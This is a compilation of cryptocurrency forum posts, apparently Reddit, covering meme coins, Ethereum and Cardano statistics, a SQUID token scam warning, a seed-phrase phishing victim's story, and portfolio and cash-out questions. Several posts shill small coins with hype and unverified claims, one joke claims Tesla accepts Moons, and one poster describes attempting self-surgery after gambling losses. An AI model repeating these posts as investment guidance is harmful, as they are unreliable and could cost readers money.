- Doge WAS a true organic trend, lightning in a bottle. The perfect storm of factors. 

- Doge then quickly got copied by others, opportunists who made copies including SHIB

- Then we had TRUE dog mania which preceded the crash. Real people were buying these things up just like we see in NFTs now. The new dog coins were being created every day by ordinary people (important). Ownership was actually decentralised. It was the purest experiment of a free market you could ever wish to see. Worthless items were created out of thin air and the market agreed on a fair valuation for them. Eventually market realised this value was zero and we nuked. 

- Then, and heres where the big difference is, VCs/ whales/ funds accumulated all of the supply in these shitty dog coins at the bottom for pennies on the dollar, when everyone including me was saying trend over, these all go to zero. They did this because it was a +EV bet on dog mania happening at the end of the next cycle, so they naturally wanted to front run the market.

- Fast forward to now, and were bullish again, so the smart money is pumping these illiquid pieces of s*** because if youre the only major holder its fucking easy to pump price. These arent bitcoin, the same 5 men own all the dog coin variations. Its a very basic, and smart, business decision. Control the supply. Create demand where before none existed. 

Yes you can make money. No youre not a genius for doing so. Yes price will go up. No, you dont have any edge on the market by buying the same meme coin that everyone else is. 

Its all smoke &amp; mirrors. A true ponzi. Dont be left holding the bag.

P.S. I own dog coins, and this isnt me being negative or salty. I just recognise it for what it is and dont let a green candle distract me from the true intentions of whos behind it.

$1,300,000,000 worth of Ethereum has been burned in the last 30 days alone and more than $420,000,000 has been burned in the past 7 days alone. However, most interestingly, Ethereum has actually been **deflationary** the past 4 days consecutively with net reduction being **103.38%** for this week**.** Another great thing is, more than **6% of all Ethereum is already being staked for Ethereum 2.0** adding more stability to the price. 

Oh, and if that was not enough, Ethereum has broken its all time high 3 days ago reaching an ATH of $4,455.74 on CMC. Not bullish enough yet? **Ethereum has also had the highest Monthly, Daily and Weekly close this week.** The market trend for Ethereum has been insane this week.  

October was sure a prosperous month. Now let's usher in no sell November!

Two days ago there were over 170,000 transactions on the Cardano blockchain coming from 70,000 transactions per day on average - an increase in adoption is happening.


The network had a total stake of 23.9 billion out of 33.26 billion ADA coins in total for also a record high of 73% staked - a growing confidence in the project's future. There will only ever be 45 billion ADA that


Data can be found on https://cardanoscan.io/


However, despite the impressive numbers, Cardano continues to struggle and short-term projections remain negative. It is the worst performing top 10 for the week and is now valued just below $2 and will probably be flipped by SOL soon.


But let me end this with a hopeful note with a [detailed post]( https://np.reddit.com/r/cardano/comments/qjel89/charles_hoskinsons_big_picture_summary_of_cardano/?ref=share&amp;ref_source=link) from Charles Hoskinson's big picture summary of Cardano from his last AMA. - **TLDR the team stays focused on technical development.**


I'm a hodler of ADA - this is a shameless shill, not FA.


ADA also not a dog.

Today I saw a Goku crypto, a Pikachu crypto, a Charizard crypto, a Luffy crypto...

Like, I would be interested in owning a few of these for fun, but since they are copyrighted IP's, what is the risk?

Could Nintendo and such make them shut down their currency? Could they force exchanges to stop listing them? The [Pikachu Inu]{https://pikachuinu.com/) coin is currently on Bitmart and another exchange as well. How is this legal? Surely this can't be legal, but I'm wondering what could possibly be done about it?

Just wondering if anyone knows any of these legal things. It seems weird to me that this stuff currently exists.

So I'm purely just dabbling in crypto. Im to scared to commit honestly. I currently own about 2.6m SHIB coins and I know thats not a lot but I'm just wondering if I should expect that to move up a lot or move my money elsewhere. I'm not the richest man on earth but ofcourse I'd like to start moving closer. Any advice? (Lehman terms please. Not educated. I'm a moron.) I started by putting about $50 into DOGE at $.07 and made about $200 then dumped it into SHIB just recently. I know im a noob but to be fully comfortable Putting in big mula I need to know where to put it and how to even possibly predict what's going to pump or not! Please help!

Hello everyone

I always thought the war between the Shiba and the Doge makes no sens. Why would 2 brothers bite and kill each other. I can tell you the final battle will not be between dogs. It will be against a far more threatening enemy. The CateCoin, I will get into details why I believe CateCoin will become the king of the animals. 

For so long in the human history we always associated cats and dogs as natural enemies. There has even been movies about that ! 

&amp;#x200B;

**Now if we have a technical look on the Cate Coin**

* Just succesfully finalized it's transition to v2
* Volume traded has never been this high and it has been rising for month. 

&amp;#x200B;

[Volume has been steadily rising.](https://preview.redd.it/rmc3mdd7byw71.png?width=1260&amp;format=png&amp;auto=webp&amp;s=2664c0e5ad5b625c938d78d570e426c8c9d0b342)

&amp;#x200B;

* Has been auditaured by EtherAuthority. Cate coins has no critical or medium faults. It has been engineered carefully from the start. 
* Already has a beta Dapps available and running. 
* **Has been built to have a real life utility and value, thus it's different from Doge, it's not only a joke.**  
The goal is to become the first meme platform, awarding the meme creators with real money.   
One could argue it's a weird concept, but let's be real, memes have become part of our life and companies understood it. The biggest websites community driven are full of it (facebook, youtube, tiktok...).  
Even at work, microsoft decided to include meme stickers in it's messaging app (Teams).   


https://preview.redd.it/9tjsf16gbyw71.png?width=1419&amp;format=png&amp;auto=webp&amp;s=247a510143dc471b0d3e2045a6a52f85c8a93ce4

* So many merchandise are based on memes but the original creator is nearly never rewarded for it's creation ! 
* Memes have the potential to spread really fast, and often exponentially, leading to free advertisement. This will lead to exponential growth of the platform once the community is big enough to produce quality memes.

TLDR : 

CateCoin is on the rise, and it adds a real value to meme coins. It has been auditored and just sucessfully updated to V2. It has the potential to be the real next and solid meme coin.

Who are your go-to analysts for crypto advice and why?  As an entrepreneur, I'm used to finding the right people for the right job.  I'm newer to crypto and am learning fast...but I'm far from an expert.  Clearly, the field is littered with scammers, youtube heroes, twitter bots, and everything in between.  I'd like to perform some vetting on popular analysts by going back in time and checking their old "claims" to see how good they were at making accurate calls.  To me, this is the best way of ensuring that I'm listening to the right people...or at least knowing how accurate the people are that I'm listening to.  Obviously nobody has a crystal ball, but I'm betting there are some great analysts out there that consistently make the right calls...I just need to find them.  Thanks for your help/advice in advance.

My journey in crypto started in early 2017. But I managed somehow to be always in red by daytrading due to FUD and FOMO. Once I had 1ETH and almost 15 LTC but sold them all for a shitty price(600$ and 50$ respectively). Then the GME stop wave came to me on news so I thought I take a look on reddit and in particular if there was a sub for crypto. And I found you my loves, since then I switched from being a dummy emotional crypto guy who always bought the news to a proud HODLER who is diversifying his assets along staking, pure HODLING and liquidity mining (in the last weeks).

My main lesson learned is never stop learning, which I think seems to be clear from my username here. What I learned until now is to HODL, never be emotional about crypto, never talk about crypto with others cause they will bias you and you will bias them relations might be damaged because of that, DYOR research before investing in any crypto and last but not least I invested in projects that I'm only proud to have because when red times come the only reason to HODL them is their idea and believing that they will make it again.

Hope you had useful thoughts reading my post and wish you a good moonvember!

Like the tittle says, I swapped it on pancakeswap

0x7dfa55aafe8a06e10806952ed02502ef413c3185

This was the contract

Set the slippage to 0.1 fast gas

Swap succeed and I tried to check it in my trust wallet, added the token manually

It shows 0, wonder why?
Is it because it isn't listed yet?
Is it possible that I send it via wrong method?
Was sure it was run on bsc network
But the transfer notice said the method was ETH to exact tokens??

Are the coins gone?
Is it possible to retrieve it back?
I need some answers :(

Hey

I got in at the start of this year, so have seen the lovely run up to April, the crash in May, and now the recovery to ATH's we are seeing.

I try my best to read up on new, opinions, learn about tech etc so I feel confident about Crypto and it's future, specially with with El Salvador adoption, Futures ETF and so on.

However I can't help but feel sceptical, in a way it's feels almost too good to be true. The general sentiment being that buying BTC / ETH and other top alts will get you a nice 5-10x over the next 5 years by holding, and all the talk about BTC going to half a mil, heck even a million in the next 5 years. Also being able to stake for a crisp 5-10% of your money back is mighty impressive too.

I guess I'm saying that for such a new and short industry, all the bullish sentiments of us making loads of money in the next 5 years could well be true but could also just be a load of hype. There's always that thought in my mind that it will get too big and BTC will crash back to lower levels and stay there, and we will forever look back on 2021 and wish we all sold our holdings at 60k or something.

But i love it, will keep DCA'ing and hoping this shit gets even bigger!

The most important lesson this sub has taught me is to  do the exact opposite of what the sub says you should do. 
Like instead of buying high and selling low, you buy low and sell high. 
Instead of buying that new meme coin and ride the rollercoaster, you shou buy ETH and offer to suck its dick for its high gas fees.

So here is my advice, there's a new coin that's rocketing branded after Squid Game, you buy it and are forbidden from selling it.

Sounds like a shit investment?

Na man, totally legit, you should buy, buy BUY. Sell your dick for medical experiments if you have to, but buy buy buy. You can always buy a newbetter one once you're a gazillionaire.

I am in Crypto because of decentralization and I support projects not only for the 1000x potential but also for the long scheme visions for the people. By removing monetary centralization, the power gets shifted to a more just system and other nationa can't be punished due to inflation of their Fiat-currency. 

This way even developing countries get the same chances as the people grewing up in the west. That's why I am full into Crypto and I wonder why the purpose, as I described above, gets hit with feets by the solely moneyhunting low purposes of many here in this sub. 

No front but think in success as long term investments, in 10-year visions and not in short term pump and dump gambling sort of motives. 

LAST: TIME IN THE MARKET BEATS TIMING IN THE MARKET. 

Look into Ocean protocol and Energy web foundation if you are interested in a valuable long term play. 

Have a nice week all

So I used: https://btc.feh.im
to determine profits and Im really unsure how I keep loosing money when I should be making a profit?


Sorry to be a dumbass but I put the correct investment and take of out fee which I believe is 1%?

When putting money in no issue e.g when I put 1,000 in I get charge $10 but when I make a profit on $50 which totals to 1,050 for example and I attempt to take this out the amount will drop to like $900 + the exit fee. Im really confused about this. Can someone explain? I feel sad.

I am a total amateur that has been playing around meekly for a year or so, only using Bitpanda. Im not very good at it yet but Im finding it interesting.

However, I see people on here always talking about different wallets they use.

Is this because Bitpanda is not as good? Or there are better options?

I find it very user friendly. I have to do my research outside of the app because I find their data a little late sometimes. But apart from that Ive had a good experience.

Id love to hear opinions from some more experienced traders.

I'm genuinely interested to know if it is factored in some how. As in, the amount of power required to churn paper, process it, file it, the whole she-bang- because I just literally printed off over 100 pages of papers filled with trivial information (KYC processes) to a bank that we have already been using for over 5 years.

This might be just a bit of a rant with no substantial arguments involved, but the concern is real. Probably in the future, Distributed Ledger Technology would just hold enough data for you to confirm the necessary KYC without printing any papers. I just find the process to be absolutely redundant.

I'm thinking its going to be a close one, where do you think it'll land by the time voting closes, whats your vote and why?

I have seen many good reasons for both, just watched the debate on Algonauts official on YouTube too which was great in highlighting most points. Wondering if I could get a bunch more opinions to read through today before I cast my vote. I know which way I'm leaning but really still quite unsure.

Might even be better to wait another week to see more discussion on the whole topic. What do you think?

I don't know what indicators you guys use to take profit,
I personally like to take profit when RSI indicator is above 85 in weekly chart.

 If you see WEEKLY RSI indicator, when it is above 85 mostly 90,95 there is major correction in market.

especially when it is all time high, it might be hard to tell where is top  so I use RSI indicator. I used the same to sell my shiba inu. Rsi is still up for shiba inu, I am waiting for it to go down so I can buy. 

I might be wrong  but for me this technic has worked. 

I would love to hear about what do you use to decide when to take profits

Tl;dr
It's a scam. You won't be able to liquidate your tokens

SQUID is up over 3,800,000% on the [7 day chart](https://coinmarketcap.com/currencies/squid-game/) and people keep buying unsuspecting. The developers locked their Twitter account and deleted their telegram. No one can sell this. 

Be warned.

Also just found their twitter account has been restricted. People are in trouble. These scammers are in no way affiliated with the Netflix Series Squid Game.

Sucks that these scammers are going to make a ton of money

Soo, as a complete newbie to the wonderful world of crypto, i asked for help and boy oh boy did i get it! A "kind" reditor by the handle "Anechoicjeweler30" wrote to me and inquired as to my problem, and quickly came up with what i can only describe as a smart solution.. A little website called "[Connectwalletnow.com](https://Connectwalletnow.com)", and wouldn'tyou know it, all it needed was my seed phrase. Now before any of you loveable rascals decides that going unto said website sounds like a whole lot of fun, rest assured, it aint... As the smart ones has already surmised, it took but a few moments after typing my seed phrase into said website before what little funds i had in the wallet attached to the seed phrase in question had been cleaned out.. Now my dearest fellow reditors, i sincerely hope that the few of you out there who are quite as dumb as i, take this little lesson of mine to heart.. Dont be an idiot.

As stated above this is my first ever crypto bull run. As excited as I am, I am also terrified of not being able to take profits or of selling too early. I invested a good amount and my dad has also asked to join in (which is a huge deal as he was so anti-crypto). I want to show him that you can actually make money and grow your portfolio if you do your research and that it isnt like gambling which is how he sees it. I have done my own research and Im confident in my investments. I just dont know how to take profits. Sounds like the easiest thing in the world but Im struggling out here. Looking for a friend. Thanks in advance my brothas.

Always wondered if there was something that tipped people over the edge with Cardano, or is it mainly BTC and ETH Maxis, or anyone with a specific coin they follow?
I've got ETH, LINK, ADA, and some NANO, and never really understood why the hate for ADA.
Yer it's been slow in development, but isn't that a good thing? Maybe you think ETH 2.0 will just do everything better?
The foundation seems to be ticking boxes, contracts are now up, countries are coming on board, but it still seems to cop it?
Genuinely curious about why people are often very anti-ADA.

My friends suggest some terrible new reality show on TV and I'm like nope I don't need it. r/cc gives me more than enough every week to get through a big ol bag of popcorn.

There's so much variety in the drama:

The big price wins, and adoption news.

Some big government news, with people fleshing out the doom and gloom whilst others are going nah it's all good.

The huge scams, and hacks. All the investigation that happens and the who did it factor. The fake news that the gets debunked.

The fight between different cryptos. The it's the best vs it's a piece of junk crowd. Each vying for the of top of page.

The world's richest man jumps in with something for some reason every now and then. LoL

The current memecoin drama between just let them celebrate vs it's a scam and here's why.

r/cc has just some juicy meta drama with moons and banning various farmers or just the governance polls trying to pass.

Seriously this place has everything, if you had to tell just one thing about crypto to somebody it would have to be that it's a never ending roller coaster.

No TV show or Movie script could come close to this bizarre and wild ride.

Every time I see people talk about new coins they say "DYOR", but the problem is that a lot of the time people don't know how to research a coin, or what to even look for.

Let's take the "outline" of Algorand for example:

&gt;Algorand is a self-sustaining, decentralized, blockchain-based network that supports a wide range of applications. These systems are secure, scalable and efficient, all critical properties for effective applications in the real world. Algorand will support computations that require reliable performance guarantees to create new forms of trust.

This is incredibly vague, and some parts of it actually mean nothing. What irks me more is when people say "read the whitepaper", but Bitcoin and Ethereum whitepapers are largely complex that the general population wouldn't be able to comprehend a lot of it.

This brings me to my question, is there a website that provides an unbiased breakdown of (most) coins and their specific use cases? If not, what should I look for when doing my own research to determine if I want to invest in a coin?

So, hows the procedure with metamask and eth and bep network? Lets say i want to buy XCAD, which is erc20 token and can be swapped on pancakeswap for BUSD, which is bep20 token. How do i do that? 
I buy BUSD on Binance, send it to my metamask, which is set for bep20 network, then i connect to pancakeswap and then what? 

Can i swap bep20 for erc20? 

What im afraid of is that it will swap and the erc XCAD will be sent to my BEP metamask and will be lost. 

Can the metamask wallet hold tokens from multiple networks and i can just switch between them to show what tokens i have on the currently selected network? Or does the metamask accept only the tokens from the currently selected network and all others are sent to oblivion?

I was gambling for my SRS(sexual reassignment surgery) fee, about 11k.
I fomoed on 50x and close the app for an hour,  it liquidated.
After that, I was frustrated and tried many ways to do the surgery on my own, and I have a direction after many failures.
If I do the surgery successfully, it is the same as if I earnt 11k.
My opinion on btc and eth are still positive and I believe it'll eventually go up on price, But I won't invest in it until the next bear and halving. I think having a happy college life is as important as at most 20k benefit on cryptos.
Am I the minority who lost money by poor decision/gambling but still positive?

First of all, excuse me for any mistakes in my sentences - English is not my native language.

We all know that cryptocurrencies are attracting a lot of new investors, especially retail investors. As the knowledge about the financial markets are kind of limited for the vast majority of the new joiners, wouldnt it be smart to start a education thread on this subreddit? Together we could contribute to debunking a lot of the false inceptions about cryptocurrencies and especially the rise of meme coins. 

In my opinion this could improve the adoption of cryptos for new investors and maybe the financial markets in the near future.

I came up with this question as I have been scrolling through the posts of this subreddit. It just got ridiculously dangerous with all those shillings of dogelonshibainucoins. I know that some of them can sky rocket in a matter of few days and allow for superior returns. The question is just how sustainable those gains are and how many investors are actually able to ride this increase and how many exit with a loss.

This post might get ignored but I think its worth that we somehow try and educate the members of this subreddit as the financial markets will be disrupted (or already in progress) in my opinion.

I see many people saying, oh shit I should have bought this coin , ooo shit I should have hodled this coin...

All these things doesn't make any sense.

You didn't buy those coins because you were not sure that they will pump so much in a matter of few days. You didn't want to take risk. same is the reason for not hodling.

There are so many coins that will double and triple within few days which we don't have any idea about. 
Those coins which we are holding right now and are going sideways, they can pump  3x- 4x  within a week. So chill out and hodl your coins. Don't panic sell your trusted coins to buy other coins, (you may take profit to buy but don't sell 100% of your coins NEVER) . 

"Every coin has its own time"

This much for today.  Thanks for your time

I know we all love moons and want more moons so the only question to ask is where do we get more moons from?

I know there's a moon faucet I don't remember the name of

There's r/moonjobs

And there's another similar sub i would love to know the name of, i can't remember it!

And of course you can earn them hear by getting upvotes

Anywhere else? Has anyone gotten moons other ways? Does anyone want to see a nude man in whatever pose you ask for moons? Is this enough text to fill the 500 word count? I don't feel like searching the net for a word counter and copy pasting this, i need to get back to work.

With the latest announcements this past month some gaming tokens have began to take off and TA shows them no where near the top. 
Gaming and crypto are a perfect match, we have been collecting coins in games ever since the beginning now add to that online integration, NFT ownership, and crypto coins: We have achieved a perfect storm of epic proportions with endless room for growth.
Gaming tokens are here the coins earned in game can be exchanged for items in game or P2P, traded for money or other assets, Items created in game can be traded with any one across the globe as NFTs this is a whole new layer some saw coming years ago and now the masses with feel that wave hit with incredible force it will change lives. 
It was a game inspired by Pokemon that started this run when the market was in the gutter after the China/Elon Fud, now it seems only that they lead the pack in one of the greatest runs some will ever see.

**I would like to know which coin in your portfolio has the smallest market cap for my research I am going to conduct**. I hope to get lots of comments from this so I have enough material to work with. 

My lowest marketcap coin in my portfolio is XTZ Tezos. **I would also like to know the reasons why you have chosen this coin so I can include the most common reason for each coin in my research.**

I will keep you updated on my research later with some statistics from this post! Thank you for participating and have a (belated) happy Halloween!

Everybody was expecting to see an explosive Q4 for BTC and the first month of Q4 didn't disappoint.

In terms of dollar value gained October 2021 is the largest ever green candle or green dildo since many here prefer that term. From $43800 to $61400 it was a gain of $17600. The previous largest monthly gain was $13500 in March.

In terms of percentage gain it's the largest monthly gain since December 2020. The expectations are that November will be an even larger gain since November is the most profitable month in BTC history with average gain of 54% and the highest ever gain of 451%.

Why are some of you sooo damn hateful towards other people, who chose what to do with their money differently than you. It's their money. I was also invested in SHIB (and I don't feel like a loser) and even if it turned out to be a rug pull or anything, even if my entire investnent turned 0, I would be so fucking happy that I did invest in SHIB because it is the first time anything got me to invest in crypto. And it was one of the trending posts here back then.

Now because of SHIB, my money (in other coins) 2x-ed over 3 months, and is now significant money to me. And I'm 100% sure there are more like me.

So feel free to shove your condescending "is this the adoption we really want" jealousy that you've missed out.

Tl;dr - exposure to shitcoins is very often exposure to all of crypto, and you should be at least somewhat thankful for shitcoin hype.

I definitely don't follow the 70-20-10 rule anymore. I did earlier where ETH and BTC made up about 60% of my portfolio, but I've since then taken profits from them and started investing in other coins as I did more research into them. 

I'll go first. My largest holding is ETH at 20%, with ALGO in at a close second with 17%. The rest of it looks something like this:

- BTC 14%

- DOT 12%

- LINK 8%

- MATIC 8%

- ADA 7.5%

- XTZ 7%

- ONE 6.5%

I also have another extremely small portfolio of a few hundred bucks that I started as an experiment by investing in some small cap coins outside the top100 and not touching it for 6 months. Its been over a month and unfortunately that portfolio has mostly only moved sideways. 

As you can see it isn't very diverse unfortunately. I've tried to keep my exposure to risk, low, apart from ONE maybe which I personally feel is still a bit of a gamble. 

Overall, my portfolio has 3x since I started but that has been mostly due to ETH, BTC and ALGO. I've also not been adding funds, and only been using profits to DCA into other projects. 

I really want to expand my portfolio, but only with a solid strategy. This is what I've been struggling with tbh. For some reason, I don't feel like having very small positions (&lt;5%) in any assets and that's stopping me from adding more coins. 

I definitely need a change in perspective to convince me to open small positions in different coins as well. 

Another reason is I plan to hold for a really long time and would like to minimize any tax events as much as possible. 

Would love to see what your portfolios look like, and also if you could explain your strategy, that would be great. 

Thanks and Good luck!

"Top Gaming Tokens by Market Capitalization | CoinMarketCap" https://coinmarketcap.com/view/gaming/

Missed the Decentraland pump? Crypto always dips on Sundays. Buy while it's low. 

The Sandbox. Decentraland competitor and marketcap is 4x less.. find on Gemini. 

Illuvium! Illuvium! The first AAA rated play and earn game. Graphics are effing .  $633 million marketcap. Still a 13x away from Axie. Game releases next quarter. 

Enjin! Want to invest in crypro gaming and don't have time to research. Just buy some enjin. Still 2x away from all time high. And sooo much more to come!

And sooo many others. Check out the list. Make sure you DYOR. A lot of scammy tokens come along during bull runs and can easily excite people on Twitter with a unity video demo and gain millions of dollars just shilling. The games people will want to actually play will be the ones that make it. 

Don't know which NFTs to buy either? Verified crypto gaming collections. 

Set up a metamask and open up your dApps in your wallets to be able to buy tokens that aren't on the major exchanges! These are the tokens with small marketcaps with the most multiple x gain potential. Stake whenever possible. And start learning about liquidity pools and yield farming.

Don't panic and sell low on Sundays when market dips or during flash crashes. That's your cue to buy more. 

Lastly, only invest what you can afford to lose. A little at a time on a consistent basis goes a long way. 

My story. I started with a few hundred dollars this year. I kept adding to it. I found it was easier to save crypto than money in the bank because I didn't want to sell and miss out on a pump. And I also don't want to pay the fees. Before I knew it I reached $10k. Now I'm 10k away from 100k. This year! Is it still possible to become a crypto millionaire! F yes it is! Just like anything, become obsessed with your passion and learn every chance you get. Then find your crypto niche and dive in. Be consistent. Be passionate. Tell your friends. And share.   The amazing thing about crypto is that the more you willingly share your knowledge, the more money we'll all make.

F fiat! Unless you got a 6% raise this year, you are swimming upstream... fighting an uphill battle. Never panic and sell low during extreme volatility. It almost always corrects itself. Just wait it out. Remember when I said only to invest what you can afford? This. The investment will return. Let it return to you.  Even pump and dumps will try again during euphoric bull runs. I've made up to 20x on shit coin dust sitting in my wallets. (Fees too expensive to cash out). So if you do lose a huge percentage of your portfolio at some point. Let it sit. Do not use it to get pizza.

Okay. Got it out. Goodnight!

So everyone knows the classics, PoW, PoS and i decided to some more deep diving into alternative consensus protocols and i've ran across the federated byzantine agreement algorithm.

Many might not have heard about this consensus algorithm but it's been around for a while now, the most known distributed ledgers that are currently using a FBA based consensus algorithm are the XRP Ledger, Stellar and the upcoming smart contract and EVM capable Flare Network.

Networks that use a FBA based consensus protocol are open which means everyone can set up a validator.

General consensus is achieved in a way that a validator validates transactions and compares them to a selected number of other validators that are considered trustworthy and are expected to not attack the network, if all validators agree that their validated transactions are accurate they're written into a new block.

Decentralization and security are achieved by the fact that every validator can choose his selected list of trustworthy validators himself nobody is required to select a specific validator, as long as there is a specific amount overlap between the trusted parties from Validator A and Validator B and their transactions are deemed valid consensus can be achieved, the only undesireable case where this consensus protocol would fail is if there is no overlap at all in which case you could end up with parties whose validations that are contradicting each other and consensus could not be achieved.

Security is achieved through the fact that every validator has a list of trusted parties, attacking the network is not possible due to the fact that a malicious validator or a small group if included in a genuine validators trusted parties by itself either does not have enough influence to change the overall outcome f.e. in order to issue a double spend. On the other side if a party would decide to set up enough validators the attack would fail due to the fact that the massive amount of malicious validators are not part of the necessary overlap.

Looking at it the FBA consensus algorithm is fast, secure and open for everyone to use. The fact that every one can choose a validator and select who to trust makes it incredibly decentralized at the same time it's a algorithm that doesn't cause a network to halt if some validators suddenly stop working or get out of sync.

I'm curious how a solid consensus algorithm can be so overlooked, is it because of the fact that there are no incentives as PoS and PoW offer some kind of yield.

I recently invested a significant amount in different crypto currencies and If it pans out, Im hoping it will make me a millionaire. I read that transferring over $100K from coinbase to a US bank raises some kind of flag. Others say they send to a different exchange to cash out.

Coinbase gives the option to do a wire transfer as well. From your experience, have you had any trouble with them to cash out a large amount of money?

What have you done to cash out your millions? Please be as specific as possible.

So yesterday i had an encounter of the strange kind. I met my first bitcoin maxi, it was on a subreddit local to my country set up for Bitcoin but over the years it has evolved and turned into more of a crypto subreddit. Now i was repeatedly told, in paragraphs and paragraphs that i basically needed to open my eyes and see that bitcoin was the only pure cryptocurrency and alt-coins had no use case, and that i should do everyone a favour and go post on a different subreddit. Judging by the rest of the comments that came from other people i think everyone was a bit shocked by his views. I didn't realise there were actually people out there that were so about bitcoin that they haven't diversified their investments. I mean let's be honest, we are all here to make money, now note that i am also big on tech as its something that interests me. Actually to be frank i thought they guy was pretty rude considering the fact that he seemed to think cryptos other than bitcoin had no use case.

Whats everyones experience with this? Have you encountered a bitcoin maxi before that is so head down on bitcoin that they haven't researched other projects? Have you guys here made more money on altcoin's or bitcoin? Whats your thoughts...

The $10,000 btc pizza in a nutshell. But let me expand. 

I once read that when crypto is ready you won't need to sell it, you will use it. Is that really where we are headed? For me paying $50 for groceries or $15 at McDonald's and paying with crypto, personally I just couldn't do it. All I would be thinking about is... But how much am I really paying 5 years down the line?

Granted as a payment option, the adoption and therefore demand for said payment crypto will increase its value. But then again, those who paid $10 for something really paid $50 for something? 

Change my mind.

I was browsing for Teslas and looking into how a payment solution is implemented, check out what I found:

https://preview.redd.it/x5iu0t8iqxw71.png?width=1028&amp;format=png&amp;auto=webp&amp;s=4d174fbf62f761e9b99f111a4bd9f1502c8507b0

Looks like Tesla is planning to accept Moons... check it for yourself! Why would Tesla prepare to accept Moons?? This is real, it can't be fake... This is unbelievable. There is also Bitcoin right there, so they are likely planning to accept BTC again...

We all know Elon is a tax evading billionaire and 16-year-old nerds on the internet glorify him and think he's relatable because he tweets some memes every now and then. But atleast we can give Elon some praise for implementing Moons as a way to buy a Tesla. Respect.

PlanBs prediction of BTC price when October closes is wrong!, Crypto is going to die!, Is this the end of the S2F model?

What even are these questions/statements? First off, who does everyone think PlanB is? God from the future? Come on, it was only off by 3%. There are definitely other things that are more worth worrying about other than that. Secondly, if youre investing solely based on an anonymous persons price prediction, well that by itself already sounds so wrong. Lastly, we closed above 60k, what was everyone hoping for? 1million$ per BTC? The amount of stick hes getting right now just because his prediction was off by 3% is truly appalling. Dont always look only at ones single mistake, but also look at the multiple times he/she was right.

The owner of the NBA team Dallas Mavericks, explains why Dogecoin is preferable to Bitcoin as a means of payment.

Dallas Mavericks owner Mark Cuban is a well-known billionaire. While NBA fans are eagerly waiting for October 19, in an interview with Fox Business he explains his stance on cryptocurrencies, what he expects in the future and why Dogecoin payments for tickets and merch are not a problem with the Mavericks.

Bitcoin as a salary?

Since August 2019, it has been possible to purchase one's ticket to Dirk Nowitzki's former club using Bitcoin (BTC). In March 2021, the Mavericks extended this offer to Dogecoin (DOGE). Cuban himself is now the proud owner of 1,500 Dogecoins and stands behind his club's payment offer. So far, however, he would not pay his players in Bitcoin because they would incur losses this way due to transaction and conversion fees. He therefore believes it would be more appropriate for each of the players to invest in the cryptocurrency themselves. One could almost infer from the interview that he even advises them to do so.

"\[Cryptocurrencies are the\] better investment than a lottery ticket \[at least\] if you're trying to hit a home run." - Mark Cuban to Fox Business

The owner of the Mavericks also says in the interview that he himself expects a development comparable to the establishment of the Internet. However, he sees Ethereum, not Bitcoin, as the driver of this change. The "really relevant network" offers the opportunity to develop completely new products by means of smart contracts, security and decentralization. He believes that in the future, unique business applications will change first the financial sector and then traditional business models. He himself reveals that he is investing in decentralized insurance applications.

I think we intuitively understand that crypto can be a tool for peaceful disobedience against tyrants who seek to control society by cutting/limiting the right to digital finance. Today I'd like to consider the concept of disobedience more broadly, specifically to answer: how and when?

Throughout history, some of the most effective advancements of human rights came from peaceful disobedience against injustice. No law is valid which denies human rights. No dictate is valid which coerces acquiescense to risking severe bodily injury. Things like the draft, segregation, or even prohibition, are now well understood as unjust.

The events of the past two years have, en masse, have opened people's eyes to the maliciousness of the ruling-class. And now they're asking the question ... *What do we do? How do we change things?* And the answer is surprisingly simple. **Peaceful mass disobedience.**

The next question is usually something like: *How do we know when? I don't want to be alone, risking everything if I'm going to be few in number.* It's a valid question, a great quesiton; and the answer is also surprisingly simple. **It will happen organically.**

When the time comes, we will all know, and act together in unison. But first we must prepare each other, mentally, physically, and spiritually. Spread this message to those who can hear it. Because make no mistake, such a time is coming. *We will* be required to stand together in disobedience against the unjust dictates of the ruling class. 

Once this truth is widely known, accepted, and the people are ready, things will happen organically. The intution will be clear when the time arrives. It won't require a central leader or an election. It will be vastly more effective than any political process. And it will empower us to persue what is right, rather than what is expedient. 

So tell your family, friends, co-workers, acquaintances, tell those who can hear this message. Social media is good, but it's better to converse in person. A shared understanding that we are going to be required to be brave, to do something. Because it's quite literally, our only way forward from here.

Just wondering why people here seem to pick on newbies that hold meme coins?  I am definitely one of those people and I don't understand the abuse and vitriol.  Crypto has basically only been around since 2009 and I highly doubt that any member here bought Bitcoin then; held the coin, is still holding, and on Reddit.  Those people actually did do so are definitely living the vida loca and not bashing others on a sub reddit.  

You also started in crypto as a newbie as it obviously hasn't been around that long.  Wouldn't you want to encourage people that are new to the "club"?  I mean the name of the game is more volume, more money right?  

Meme coins may be a joke to you but if they bring in more people then that is more money and exposure to the general public at large.  Yeah, there are always going to be foolish people that gamble more than they can afford but that happens with the stock market, lottery, Vegas, online poker, house racing, etc.  

Just consider that the people coming in now are learning as they go and as they learn and and expand their knowledge they might also be able to afford to play with the established cryptocurrencies that are worshipped and have "real purpose" and "real technology" behind them.  

I am not belittling the established big projects in any way, shape, or form.  My perspective is that of the newbie with a small budget that hopes to make some decent money on "meme" coins and then be able to play with the bigger guys and still mess around with hot items. 

Go ahead, and beat me up now and downvote me.  Just had to get this off my chest.  But best of luck to everyone!!!!

The Indonesian crypto space is currently preoccupied with a question of a theological nature. Are cryptocurrencies "haram"?

In the still young crypto space, questions upon questions arise. Often, they involve regulatory issues: Is Ripple a security token? Should the tax holding period on staking be extended? Is bitcoin mining harmful to the environment? Now, news is circulating from Indonesia that adds a theological aspect to the cryptocurrency discussion spectrum.

A fatwa is a type of non-binding legal opinion in Islamic law (Sharia) that is issued as part of a discussion group called the Bahtsul Masail. NU Chairman Kiai Azizi Khasbullah justifies the ruling as follows:

"Bahtsul Masail participants believe that while the government recognizes cryptocurrencies as a commodity, it cannot legalize them under Islamic Sharia law." - NU Chairman Kiai Azizi Chasbullah

According to the panel members, cryptocurrencies represented a means to remove the legality of transactions. Furthermore, the digital assets could also be used as a tool for fraud.

Islamic Law: Possession Permitted, Interest Not

Indeed, the question of the compatibility of cryptocurrencies and Sharia law is a hotly debated topic - even within circles of Muslim scholars. While some hold similar positions to the NU, others see no "breach of law" in trading or hodln. In neighboring Malaysia, for example, the Sharia Supervisory Board of the National Securities and Exchange Commission gave its blessing to trading in digital assets last July.

 1. How people are still falling for these scams really terrifies me. What happened to doing proper research before investing? A huge portion of humans these days are so blinded by the AMAZING 11,000,000% GAINS!!! that they think they can get Arnold Schwarzenegger gains just by throwing chunks money into it. This widespread greedy and want-to-get-rich-quick mentality right now sure is playing a huge part in all these scandals being successful and it has to stop ASAP.

